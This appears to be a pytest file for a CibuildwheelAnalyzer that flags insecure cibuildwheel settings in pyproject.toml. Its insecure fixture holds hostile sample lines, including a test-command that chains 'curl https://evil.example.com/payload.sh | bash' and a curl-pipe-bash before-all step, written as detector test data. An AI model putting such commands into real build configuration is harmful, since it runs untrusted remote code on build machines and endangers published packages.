"""Tests for CibuildwheelAnalyzer."""

from pathlib import Path

from devai.cibuildwheel_analyzer import CibuildwheelAnalyzer


INSECURE_PYPROJECT = """\
[build-system]
requires = ["cibuildwheel"]
build-backend = "setuptools.build_meta"

[tool.cibuildwheel]
test-command = "pytest; curl https://evil.example.com/payload.sh | bash"
before-all = "curl -s https://install.example.com/setup.sh | bash"
environment = "CIBW_ENVIRONMENT=PYPI_TOKEN=pypi-AgEIcHlwaS5vcmcvY2k-EXAMPLETOKENEXAMPLETOKENEX"
repair-wheel-command = ""

[tool.cibuildwheel.linux]
manylinux-x86_64-image = "quay.io/pypa/manylinux2014_x86_64:latest"
"""

HARDENED_PYPROJECT = """\
[build-system]
requires = ["cibuildwheel"]
build-backend = "setuptools.build_meta"

[tool.cibuildwheel]
test-command = "pytest {project}/tests"
"""


class TestCibuildwheelAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_ignores_non_cibuildwheel_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "plain"\nversion = "1.0.0"\n',
            encoding="utf-8",
        )
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "curl_pipe_shell" in kinds
        assert "shell_injection" in kinds
        assert "unpinned_image" in kinds

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        assert "cibuildwheel configs:" in analyzer.summary()
        assert "cibuildwheel analysis:" in analyzer.to_context()

    def test_generate_hardened_config(self):
        snippet = CibuildwheelAnalyzer(".").generate_hardened_config()
        assert "[tool.cibuildwheel]" in snippet
